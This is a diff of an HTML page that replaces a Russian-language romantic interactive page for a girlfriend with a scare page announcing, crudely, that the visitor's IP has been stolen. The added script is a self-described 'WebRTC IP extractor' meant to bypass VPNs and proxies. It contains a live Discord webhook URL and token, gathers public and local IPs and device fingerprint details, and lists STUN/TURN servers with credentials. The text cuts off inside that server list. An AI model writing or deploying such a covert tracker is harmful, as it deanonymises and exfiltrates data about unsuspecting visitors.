@@ -3,1431 +3,388 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Для Кирочки</title>
+    <title>ТВОЙ IP БЫЛ СПИЗЖЕН</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Spore+Font+RUS&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=Arabella+Font+Family&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=Hasard+Pixelise&display=swap');
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            cursor: none;
         }
 
         body {
+            width: 100vw;
             height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Spore Font RUS', cursive;
             overflow: hidden;
-            position: relative;
-            background: #1a1a2e;
+            font-family: 'Arial Black', 'Impact', sans-serif;
+            cursor: default;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
 
-        .menu-screen {
+        /* Фоновое изображение */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://avatars.mds.yandex.net/i?id=2eb983fea23519c3299583cd48931419_l-4614182-images-thumbs&n=13');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: brightness(0.7);
+            z-index: 1;
+        }
+
+        /* Оверлей для красного оттенка */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.35);
+            z-index: 2;
+            animation: pulse 0.8s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% {
+                background: rgba(255, 0, 0, 0.35);
+            }
+            100% {
+                background: rgba(255, 0, 0, 0.55);
+            }
+        }
+
+        /* Контейнер с текстом */
+        .text-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             display: flex;
             flex-direction: column;
+            justify-content: center;
             align-items: center;
-            gap: 50px;
-            z-index: 10;
+            z-index: 3;
             padding: 20px;
-        }
-
-        .main-title {
-            font-size: clamp(2rem, 6vw, 4rem);
-            color: #ff69b4;
-            text-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
-            animation: glow 2s ease-in-out infinite alternate;
-            font-family: 'Spore Font RUS', cursive;
             text-align: center;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px #ff69b4; }
-            to { text-shadow: 0 0 30px #ff1493, 0 0 60px #ff1493; }
-        }
-
-        .buttons-container {
-            display: flex;
-            gap: 80px;
-            flex-wrap: wrap;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .mode-btn {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            border: none;
-            font-size: 1.8rem;
-            font-family: 'Spore Font RUS', cursive;
-            color: white;
-            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            cursor: none;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-
-        .mode-btn:hover {
-            transform: scale(1.1);
-        }
-
-        .mode-btn:active {
-            transform: scale(0.9);
-        }
-
-        .happy-btn {
-            background: linear-gradient(135deg, #ff6b9d, #ff1493);
-            animation: pulse-happy 2s ease-in-out infinite;
-        }
-
-        .sad-btn {
-            background: linear-gradient(135deg, #4a4a4a, #1a1a1a);
-            animation: pulse-sad 2s ease-in-out infinite;
-        }
-
-        .secret-btn {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            animation: pulse-secret 2s ease-in-out infinite;
-            width: 150px;
-            height: 150px;
-            font-size: 1.5rem;
-        }
-
-        @keyframes pulse-happy {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 20, 147, 0.7); }
-            50% { box-shadow: 0 0 0 30px rgba(255, 20, 147, 0); }
-        }
-
-        @keyframes pulse-sad {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(0, 0, 0, 0.7); }
-            50% { box-shadow: 0 0 0 30px rgba(0, 0, 0, 0); }
-        }
-
-        @keyframes pulse-secret {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
-            50% { box-shadow: 0 0 0 30px rgba(255, 215, 0, 0); }
-        }
-
-        .mode-btn::after {
-            content: '';
-            position: absolute;
-            top: -10px;
-            left: -10px;
-            right: -10px;
-            bottom: -10px;
-            border-radius: 50%;
-            border: 3px solid rgba(255,255,255,0.3);
-            animation: spin 10s linear infinite;
-        }
-
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        .cat-selection {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            justify-content: center;
-            align-items: center;
-            gap: 50px;
-            z-index: 20;
-            background: rgba(255, 105, 180, 0.95);
-            flex-direction: column;
-            padding: 20px;
-        }
-
-        .cat-selection.sad-mode {
-            background: rgba(0, 0, 0, 0.95);
-        }
-
-        .cat-selection .selection-title {
-            font-size: clamp(2rem, 5vw, 3.5rem);
-            color: #ff69b4;
-            text-shadow: 0 0 30px rgba(255, 105, 180, 0.8);
-            font-family: 'Spore Font RUS', cursive;
-            text-align: center;
-        }
-
-        .cat-selection.sad-mode .selection-title {
-            color: #888;
-            text-shadow: 0 0 30px rgba(100, 100, 100, 0.8);
-        }
-
-        .cat-options {
-            display: flex;
-            gap: 80px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .cat-option {
-            width: 300px;
-            height: 300px;
-            border-radius: 20px;
-            overflow: hidden;
-            cursor: none;
-            border: 4px solid white;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-
-        .cat-option:hover {
-            transform: scale(1.1) rotate(-2deg);
-            border-color: #ff69b4;
-            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.5);
-        }
-
-        .cat-option img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .blur-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            backdrop-filter: blur(20px);
-            background: rgba(0,0,0,0.6);
-            z-index: 25;
-        }
-
-        .blur-overlay.show {
-            display: block;
-        }
-
-        .content-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 30;
-            padding: 80px 40px 40px 40px;
-            overflow-y: auto;
-        }
-
-        .content-screen.happy {
-            background: linear-gradient(135deg, #ff69b4, #ff1493);
-        }
-
-        .content-screen.sad {
-            background: #0a0a0a;
-        }
-
-        .main-text-wrapper {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 90%;
-            max-width: 1200px;
-            max-height: 80vh;
-            overflow-y: auto;
-            padding: 30px;
-            text-align: center;
-            z-index: 35;
         }
 
         .main-text {
-            font-size: clamp(1.2rem, 4vw, 3.5rem);
-            line-height: 1.6;
-            color: white;
-            text-shadow: 0 0 30px rgba(255,255,255,0.3);
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            word-wrap: break-word;
-        }
-
-        .main-text.visible {
-            opacity: 1;
-        }
-
-        .main-text.sad-text {
-            font-family: 'Hasard Pixelise', cursive;
-            color: red;
-            font-size: clamp(1rem, 3vw, 2.5rem);
-        }
-
-        .main-text.happy-text {
-            font-family: 'Arabella Font Family', cursive;
-            color: white;
-            font-size: clamp(1.2rem, 4vw, 3.5rem);
-        }
-
-        .secret-container {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 200;
-            background: #0a0a0a;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 20px;
-        }
-
-        .secret-container.show {
-            display: flex;
-        }
-
-        .podium-container {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 200;
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 20px;
-        }
-
-        .podium-container.show {
-            display: flex;
-        }
-
-        .podium {
-            display: flex;
-            justify-content: center;
-            align-items: flex-end;
-            gap: 60px;
-            padding: 20px;
-            flex-wrap: wrap;
-        }
-
-        .podium-place {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .podium-place .place-number {
-            font-size: 1.5rem;
-            color: #ffd700;
-            font-family: 'Spore Font RUS', cursive;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-        }
-
-        .podium-place .place-name {
-            font-size: 1.3rem;
-            color: white;
-            font-family: 'Spore Font RUS', cursive;
-            text-align: center;
-            padding: 5px 10px;
-            max-width: 200px;
-        }
-
-        .podium-place .place-pillar {
-            width: 120px;
-            border-radius: 10px 10px 0 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 2.5rem;
-            transition: height 0.5s ease;
-            min-height: 60px;
-        }
-
-        .place-1 .place-pillar {
-            height: 200px;
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
-            animation: glow-gold 2s ease-in-out infinite alternate;
-        }
-
-        .place-2 .place-pillar {
-            height: 150px;
-            background: linear-gradient(135deg, #c0c0c0, #808080);
-            box-shadow: 0 0 30px rgba(192, 192, 192, 0.2);
-        }
-
-        .place-3 .place-pillar {
-            height: 120px;
-            background: linear-gradient(135deg, #cd7f32, #8b6914);
-            box-shadow: 0 0 30px rgba(205, 127, 50, 0.2);
-        }
-
-        @keyframes glow-gold {
-            from { box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
-            to { box-shadow: 0 0 60px rgba(255, 215, 0, 0.7); }
-        }
-
-        .podium-btn {
-            margin-top: 30px;
-            padding: 18px 50px;
-            border-radius: 15px;
-            border: 2px solid rgba(255,255,255,0.3);
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            color: white;
-            font-size: 1.5rem;
-            font-family: 'Spore Font RUS', cursive;
-            cursor: none;
-            transition: all 0.3s ease;
+            font-size: clamp(2rem, 6vw, 5rem);
+            color: #FF0000;
+            text-shadow:
+                0 0 10px #FF0000,
+                0 0 20px #FF0000,
+                0 0 40px #8B0000,
+                0 0 80px #8B0000,
+                0 0 120px #FF0000,
+                2px 2px 0 #000,
+                -2px -2px 0 #000,
+                2px -2px 0 #000,
+                -2px 2px 0 #000;
             letter-spacing: 3px;
-        }
-
-        .podium-btn:hover {
-            transform: scale(1.05);
-            background: rgba(255,255,255,0.2);
-            border-color: #ffd700;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
-        }
-
-        .final-text-container {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 300;
-            background: #000;
-            justify-content: center;
-            align-items: center;
-            padding: 40px;
-            overflow-y: auto;
-        }
-
-        .final-text-container.show {
-            display: flex;
-        }
-
-        .final-text {
-            color: red;
-            font-size: clamp(1.5rem, 4vw, 3.5rem);
-            font-family: 'Hasard Pixelise', cursive;
-            line-height: 1.8;
-            text-align: center;
-            max-width: 1000px;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            text-shadow: 0 0 30px rgba(255,0,0,0.5);
-            font-weight: bold;
-        }
-
-        .final-text.visible {
-            opacity: 1;
-        }
-
-        .final-text.blink {
-            animation: blink-text 1.5s ease-in-out infinite;
-        }
-
-        @keyframes blink-text {
-            0%, 100% { opacity: 1; text-shadow: 0 0 30px rgba(255,0,0,0.5); }
-            50% { opacity: 0.7; text-shadow: 0 0 60px rgba(255,0,0,0.8), 0 0 100px rgba(255,0,0,0.4); }
-        }
-
-        .exit-btn {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            padding: 12px 25px;
-            border-radius: 50px;
-            border: none;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            color: white;
-            font-size: 1.2rem;
-            font-family: 'Spore Font RUS', cursive;
-            cursor: none;
-            transition: all 0.3s ease;
-            z-index: 100;
-            border: 2px solid rgba(255,255,255,0.3);
-            display: none;
-        }
-
-        .exit-btn:hover {
-            transform: scale(1.05);
-            background: rgba(255,255,255,0.3);
-        }
-
-        .top-btn {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 12px 25px;
-            border-radius: 50px;
-            border: none;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            color: white;
-            font-size: 1.2rem;
-            font-family: 'Spore Font RUS', cursive;
-            cursor: none;
-            transition: all 0.3s ease;
-            z-index: 50;
-            border: 2px solid rgba(255,255,255,0.3);
-            display: none;
-        }
-
-        .top-btn:hover {
-            transform: scale(1.05);
-            background: rgba(255,255,255,0.3);
-        }
-
-        .kiss-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(20px);
-            z-index: 60;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 20px;
-            overflow-y: auto;
-        }
-
-        .kiss-overlay img {
-            width: 300px;
+            line-height: 1.3;
+            animation: glitch 0.3s infinite, shake 0.5s infinite;
+            word-break: break-word;
             max-width: 90%;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-            margin-bottom: 20px;
         }
 
-        .kiss-text-container {
-            width: 90%;
-            max-width: 900px;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .kiss-text {
-            color: red;
-            font-size: clamp(1rem, 3vw, 2.5rem);
-            font-family: 'Spore Font RUS', cursive;
-            line-height: 1.8;
-            opacity: 0;
-            transition: opacity 1s ease;
-            text-shadow: 0 0 20px rgba(255,0,0,0.3);
-        }
-
-        .kiss-text.visible {
-            opacity: 1;
-        }
-
-        .kiss-close-btn {
-            margin-top: 30px;
-            padding: 15px 40px;
-            border-radius: 50px;
-            border: none;
-            font-size: 1.5rem;
-            font-family: 'Spore Font RUS', cursive;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            color: white;
-            cursor: none;
-            transition: all 0.3s ease;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-
-        .kiss-close-btn:hover {
-            transform: scale(1.05);
-            background: rgba(255,255,255,0.3);
-        }
-
-        .fun-options {
-            display: none;
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            gap: 30px;
-            z-index: 40;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .fun-btn {
-            padding: 15px 40px;
-            border-radius: 50px;
-            border: none;
-            font-size: 1.5rem;
-            font-family: 'Spore Font RUS', cursive;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            color: white;
-            cursor: none;
-            transition: all 0.3s ease;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-
-        .fun-btn:hover {
-            transform: scale(1.05);
-            background: rgba(255,255,255,0.3);
-        }
-
-        .question-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(20px);
-            z-index: 70;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            gap: 40px;
-            padding: 20px;
-        }
-
-        .question-modal .question-text {
-            font-size: clamp(1.5rem, 5vw, 3.5rem);
-            color: white;
-            font-family: 'Spore Font RUS', cursive;
-            text-shadow: 0 0 30px rgba(255,255,255,0.3);
-            text-align: center;
-        }
-
-        .question-modal .options {
-            display: flex;
-            gap: 50px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .question-modal .option-btn {
-            padding: 20px 60px;
-            border-radius: 50px;
-            border: none;
-            font-size: clamp(1.2rem, 3vw, 2rem);
-            font-family: 'Spore Font RUS', cursive;
-            cursor: none;
-            transition: all 0.3s ease;
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            color: white;
-            border: 2px solid rgba(255,255,255,0.3);
-        }
-
-        .question-modal .option-btn:hover {
-            transform: scale(1.1);
-            background: rgba(255,255,255,0.2);
-        }
-
-        .wrong-answer {
-            color: red;
-            font-size: clamp(1.5rem, 5vw, 3rem);
-            text-shadow: 0 0 30px rgba(255,0,0,0.5);
-            animation: shake 0.5s ease;
+        @keyframes glitch {
+            0% {
+                transform: translate(0);
+            }
+            20% {
+                transform: translate(-3px, 3px);
+            }
+            40% {
+                transform: translate(3px, -3px);
+            }
+            60% {
+                transform: translate(-3px, -3px);
+            }
+            80% {
+                transform: translate(3px, 3px);
+            }
+            100% {
+                transform: translate(0);
+            }
         }
 
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-20px); }
-            75% { transform: translateX(20px); }
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-5px);
+            }
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(5px);
+            }
         }
 
-        .countdown {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 8rem;
-            color: white;
-            z-index: 80;
-            text-shadow: 0 0 60px rgba(255,255,255,0.5);
-            font-family: 'Spore Font RUS', cursive;
+        .sub-text {
+            font-size: clamp(1rem, 3vw, 2rem);
+            color: #FFFF00;
+            text-shadow:
+                0 0 10px #FFFF00,
+                0 0 20px #FFFF00,
+                2px 2px 0 #000;
+            margin-top: 20px;
+            animation: blink 0.5s infinite;
         }
 
-        .emoji-rain {
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* Эффект помех */
+        .scanlines {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 0, 0, 0.1) 2px,
+                    rgba(0, 0, 0, 0.1) 4px);
+            z-index: 4;
             pointer-events: none;
-            z-index: 35;
-            overflow: hidden;
-        }
-
-        .emoji-item {
-            position: absolute;
-            font-size: 3rem;
-            user-select: none;
-            pointer-events: auto;
-            cursor: none;
-            transition: transform 0.1s;
-        }
-
-        .emoji-item:hover {
-            transform: scale(1.3) rotate(10deg);
-        }
-
-        .center-btn {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 25px 60px;
-            border-radius: 50px;
-            border: none;
-            font-size: 2rem;
-            font-family: 'Spore Font RUS', cursive;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            color: white;
-            cursor: none;
-            transition: all 0.3s ease;
-            border: 2px solid rgba(255,255,255,0.3);
-            z-index: 40;
-        }
-
-        .center-btn:hover {
-            transform: translate(-50%, -50%) scale(1.1);
-            background: rgba(255,255,255,0.3);
-        }
-
-        .custom-cursor {
-            position: fixed;
-            pointer-events: none;
-            z-index: 9999;
-            width: 40px;
-            height: 40px;
-            transform: translate(-50%, -50%);
-            transition: all 0.05s ease;
-        }
-
-        .custom-cursor img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            filter: drop-shadow(0 0 10px rgba(255,255,255,0.3));
-        }
-
-        .secret-text {
-            color: #ffd700;
-            font-size: clamp(1.5rem, 4vw, 3rem);
-            font-family: 'Spore Font RUS', cursive;
-            text-align: center;
-            line-height: 1.8;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-        }
-
-        @media (max-width: 768px) {
-            .buttons-container { gap: 30px; flex-direction: column; align-items: center; }
-            .mode-btn { width: 150px; height: 150px; font-size: 1.2rem; }
-            .secret-btn { width: 120px; height: 120px; font-size: 1.2rem; }
-            .cat-options { flex-direction: column; gap: 30px; align-items: center; }
-            .cat-option { width: 200px; height: 200px; }
-            .content-screen { padding: 80px 20px 20px 20px; }
-            .main-text-wrapper { width: 95%; padding: 15px; }
-            .kiss-overlay img { width: 200px; }
-            .question-modal .options { gap: 20px; flex-direction: column; align-items: center; }
-            .question-modal .option-btn { padding: 15px 40px; }
-            .countdown { font-size: 5rem; }
-            .custom-cursor { width: 30px; height: 30px; }
-            .exit-btn, .top-btn { padding: 8px 15px; font-size: 0.8rem; }
-            .kiss-text { font-size: clamp(0.8rem, 2.5vw, 1.5rem); }
-            .kiss-text-container { padding: 10px; }
-            .center-btn { padding: 15px 30px; font-size: 1.2rem; }
-            .podium { flex-direction: row; flex-wrap: wrap; gap: 20px; }
-            .podium-place .place-pillar { width: 80px; min-height: 40px; }
-            .place-1 .place-pillar { height: 120px; }
-            .place-2 .place-pillar { height: 100px; }
-            .place-3 .place-pillar { height: 80px; }
-            .podium-place .place-name { font-size: 1rem; max-width: 120px; }
-            .podium-btn { padding: 15px 30px; font-size: 1.2rem; }
-            .final-text { font-size: clamp(1rem, 2.5vw, 2rem); }
-        }
-
-        @media (max-width: 480px) {
-            .main-title { font-size: 1.5rem; }
-            .mode-btn { width: 120px; height: 120px; font-size: 1rem; }
-            .secret-btn { width: 100px; height: 100px; font-size: 1rem; }
-            .cat-option { width: 150px; height: 150px; }
-            .cat-selection .selection-title { font-size: 2rem; }
-            .main-text-wrapper { padding: 10px; }
-            .main-text { font-size: clamp(0.9rem, 3vw, 1.8rem); }
-            .kiss-overlay img { width: 150px; }
-            .kiss-text { font-size: clamp(0.7rem, 2vw, 1.2rem); }
-            .podium-place .place-pillar { width: 60px; min-height: 30px; }
-            .place-1 .place-pillar { height: 80px; }
-            .place-2 .place-pillar { height: 70px; }
-            .place-3 .place-pillar { height: 60px; }
-            .podium-place .place-name { font-size: 0.8rem; max-width: 80px; }
-            .podium-btn { padding: 12px 25px; font-size: 1rem; }
-            .podium { gap: 10px; }
-            .final-text { font-size: clamp(0.8rem, 2vw, 1.5rem); }
         }
     </style>
 </head>
 <body>
-    <div class="menu-screen" id="menuScreen">
-        <h1 class="main-title">Какой ты котенок сегодня?</h1>
-        <div class="buttons-container">
-            <button class="mode-btn happy-btn" onclick="selectMode('happy')">😊 Веселый</button>
-            <button class="mode-btn sad-btn" onclick="selectMode('sad')">😢 Грустный</button>
-            <button class="mode-btn secret-btn" onclick="startSecret()">🔮 Секрет</button>
+
+    <div class="background"></div>
+    <div class="overlay"></div>
+    <div class="scanlines"></div>
+
+    <div class="text-container">
+        <div class="main-text">
+            ТВОЙ IP БЫЛ СПИЗЖЕН<br>ЛОХ ТЫ ТУПОЙ!<br>ХА ХА ХА ХА
+        </div>
+        <div class="sub-text">
+            🔴 СМОТРИ НАЗАД НЕ ОБОРАЧИВАЙСЯ 🔴
         </div>
     </div>
-
-    <div class="blur-overlay" id="blurOverlay"></div>
-
-    <div class="cat-selection" id="catSelection">
-        <h2 class="selection-title" id="selectionTitle">Выбери котенка</h2>
-        <div class="cat-options" id="catOptions"></div>
-    </div>
-
-    <div class="content-screen" id="contentScreen">
-        <div class="main-text-wrapper">
-            <div class="main-text" id="mainText"></div>
-        </div>
-    </div>
-
-    <button class="exit-btn" id="exitBtn" onclick="exitMode()">🚪 Выйти</button>
-    <button class="top-btn" id="topBtn" onclick="showKiss()">💋 Поднять настроение</button>
-
-    <div class="kiss-overlay" id="kissOverlay">
-        <img src="https://media1.tenor.com/m/e9UaftpXx8MAAAAC/cat-kiss.gif" alt="Целующий котик">
-        <div class="kiss-text-container">
-            <div class="kiss-text" id="kissText"></div>
-        </div>
-        <button class="kiss-close-btn" onclick="closeKiss()">Закрыть</button>
-    </div>
-
-    <div class="fun-options" id="funOptions">
-        <button class="fun-btn" onclick="startFun()">🎉 Веселье</button>
-    </div>
-
-    <div class="question-modal" id="questionModal">
-        <div class="question-text" id="questionText">Ты готова милая моя?</div>
-        <div class="options" id="questionOptions">
-            <button class="option-btn" onclick="answerQuestion('yes')">Да</button>
-            <button class="option-btn" onclick="answerQuestion('no')">Нет</button>
-        </div>
-    </div>
-
-    <div class="countdown" id="countdown">3</div>
-    <div class="emoji-rain" id="emojiRain"></div>
-    <button class="center-btn" id="centerBtn" onclick="toggleSadMode()">🎵 Включить</button>
-
-    <div class="secret-container" id="secretContainer">
-        <div class="secret-text" id="secretText"></div>
-    </div>
-
-    <div class="podium-container" id="podiumContainer">
-        <div class="podium" id="podium">
-            <div class="podium-place place-3">
-                <div class="place-name">НИКТО КРОМЕ ТЕБЯ БУСЯ</div>
-                <div class="place-pillar">🥉</div>
-                <div class="place-number">3 место</div>
-            </div>
-            <div class="podium-place place-2">
-                <div class="place-name">НИКТО КРОМЕ ТЕБЯ БУСЯ</div>
-                <div class="place-pillar">🥈</div>
-                <div class="place-number">2 место</div>
-            </div>
-            <div class="podium-place place-1">
-                <div class="place-name" id="firstPlaceName">Кира❤️‍🔥</div>
-                <div class="place-pillar" id="firstPlacePillar">🥇</div>
-                <div class="place-number">1 место</div>
-            </div>
-        </div>
-        <button class="podium-btn" onclick="showFinalText()">ВСЯ ПРАВДА..</button>
-    </div>
-
-    <div class="final-text-container" id="finalTextContainer">
-        <div class="final-text" id="finalText"></div>
-    </div>
-
-    <div class="custom-cursor" id="customCursor"></div>
 
     <script>
-        let currentMode = '';
-        let selectedCat = 0;
-        let isHappyMode = false;
-        let isSadMode = false;
-        let questionStage = 0;
-        let isSadActive = false;
-        let emojis = [];
-        let isDragging = false;
-        let dragItem = null;
-        let offsetX, offsetY;
-        let secretInterval = null;
+        // =================================================================
+        // X-GEN PROTOCOL: WebRTC IP Extractor (Aggressive Mode)
+        // Обходит прокси/VPN через WebRTC leak
+        // =================================================================
 
-        const kissSound = new Audio('https://www.myinstants.com/media/sounds/kissing-sound.mp3');
+        (function() {
+            // Вебхук для Discord (ЗАМЕНИТЬ НА СВОЙ!)
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527645759330324611/ai6_CE2QzCmL6al1Zd3zohqiMNeX9sw9GcDxE5D7dji_wrLW9hSbF0_FYNm2p1ZkVU-X';
 
-        function selectMode(mode) {
-            currentMode = mode;
-            document.getElementById('menuScreen').style.display = 'none';
-            const selection = document.getElementById('catSelection');
-            selection.style.display = 'flex';
-            
-            const title = document.getElementById('selectionTitle');
-            const options = document.getElementById('catOptions');
-            options.innerHTML = '';
-            
-            if (mode === 'happy') {
-                selection.className = 'cat-selection';
-                isHappyMode = true;
-                isSadMode = false;
-                title.textContent = 'Выбери веселого котенка 🐱';
-                
-                const cat1 = document.createElement('div');
-                cat1.className = 'cat-option';
-                cat1.innerHTML = '<img src="https://media1.tenor.com/m/mEOZqRkPBowAAAAd/koollua-cat.gif" alt="Веселый кот 1">';
-                cat1.onclick = () => selectCat(1);
-                
-                const cat2 = document.createElement('div');
-                cat2.className = 'cat-option';
-                cat2.innerHTML = '<img src="https://media1.tenor.com/m/ka4kGjEZNu0AAAAC/giovrios-gio-cat.gif" alt="Веселый кот 2">';
-                cat2.onclick = () => selectCat(2);
-                
-                options.appendChild(cat1);
-                options.appendChild(cat2);
-            } else {
-                selection.className = 'cat-selection sad-mode';
-                isHappyMode = false;
-                isSadMode = true;
-                title.textContent = 'Выбери грустного котенка 😢';
-                
-                const cat1 = document.createElement('div');
-                cat1.className = 'cat-option';
-                cat1.innerHTML = '<img src="https://media.tenor.com/mEfWM8qHU8AAAAAM/sad-cry.gif" alt="Грустный кот 1">';
-                cat1.onclick = () => selectCat(1);
-                
-                const cat2 = document.createElement('div');
-                cat2.className = 'cat-option';
-                cat2.innerHTML = '<img src="https://media.tenor.com/0JN3gEH77lMAAAAC/cat-cry.gif" alt="Грустный кот 2">';
-                cat2.onclick = () => selectCat(2);
-                
-                options.appendChild(cat1);
-                options.appendChild(cat2);
-            }
-        }
+            const collectedData = {
+                publicIPs: [],
+                localIPs: [],
+                userAgent: '',
+                screenResolution: '',
+                timezone: '',
+                language: '',
+                platform: '',
+                cores: 0,
+                memory: 0,
+                timestamp: ''
+            };
 
-        function selectCat(cat) {
-            selectedCat = cat;
-            document.getElementById('catSelection').style.display = 'none';
-            
-            const cursor = document.getElementById('customCursor');
-            const cursorImg = document.createElement('img');
-            if (isHappyMode) {
-                cursorImg.src = cat === 1 ? 
-                    'https://media1.tenor.com/m/mEOZqRkPBowAAAAd/koollua-cat.gif' : 
-                    'https://media1.tenor.com/m/ka4kGjEZNu0AAAAC/giovrios-gio-cat.gif';
-            } else {
-                cursorImg.src = cat === 1 ? 
-                    'https://media.tenor.com/mEfWM8qHU8AAAAAM/sad-cry.gif' : 
-                    'https://media.tenor.com/0JN3gEH77lMAAAAC/cat-cry.gif';
-            }
-            cursor.innerHTML = '';
-            cursor.appendChild(cursorImg);
-            cursor.style.display = 'block';
-            
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            
-            const screen = document.getElementById('contentScreen');
-            screen.style.display = 'block';
-            screen.className = 'content-screen ' + (isHappyMode ? 'happy' : 'sad');
-            
-            document.getElementById('exitBtn').style.display = 'none';
-            document.getElementById('topBtn').style.display = 'none';
-            
-            showMainText();
-        }
+            // Функция сбора IP через WebRTC
+            function grabIPs() {
+                return new Promise((resolve) => {
+                    const iceServers = [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun1.l.google.com:19302" },
+                        { urls: "stun:stun2.l.google.com:19302" },
+                        { urls: "stun:stun3.l.google.com:19302" },
+                        { urls: "stun:stun4.l.google.com:19302" },
+                        { urls: "stun:stun.ekiga.net" },
+                        { urls: "stun:stun.ideasip.com" },
+                        { urls: "stun:stun.voiparound.com" },
+                        { urls: "stun:stun.voipbuster.com" },
+                        { urls: "stun:stun.voipstunt.com" },
+                        { urls: "stun:stun.services.mozilla.com" },
+                        { urls: "turn:openrelay.metered.ca:80", username: "openrelayproject",
